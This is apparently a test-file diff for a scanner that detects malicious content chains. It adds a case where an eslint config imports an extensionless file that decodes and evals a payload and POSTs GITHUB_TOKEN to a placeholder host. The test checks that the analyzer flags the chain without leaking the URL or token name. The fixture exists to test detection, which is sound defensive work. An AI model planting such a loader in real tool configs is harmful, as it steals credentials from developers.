@@ -23,6 +23,31 @@ describe('non-executing malicious content chain analysis', () => {
     ]);
   });
 
+  it('traces an encoded tool-config loader into an extensionless outbound target', () => {
+    const result = analyzeMaliciousContent([
+      {
+        path: 'eslint.config.js',
+        content:
+          "import './init';\nconst payload = atob(encoded); eval(payload);"
+      },
+      {
+        path: 'init',
+        content:
+          "const payload = atob(encoded); eval(payload); fetch('https://collector.invalid', { method: 'POST', body: process.env.GITHUB_TOKEN });"
+      }
+    ]);
+
+    expect(result.findings[0]?.ruleId).toBe('TLP-MAL-001');
+    expect(result.findings[0]?.metadata?.trace).toEqual([
+      'eslint.config.js',
+      'init'
+    ]);
+    expect(JSON.stringify(result.findings)).not.toContain(
+      'https://collector.invalid'
+    );
+    expect(JSON.stringify(result.findings)).not.toContain('GITHUB_TOKEN');
+  });
+
   it('detects an editor folder-open task through nested local references without running them', () => {
     const result = analyzeMaliciousContent([
       {
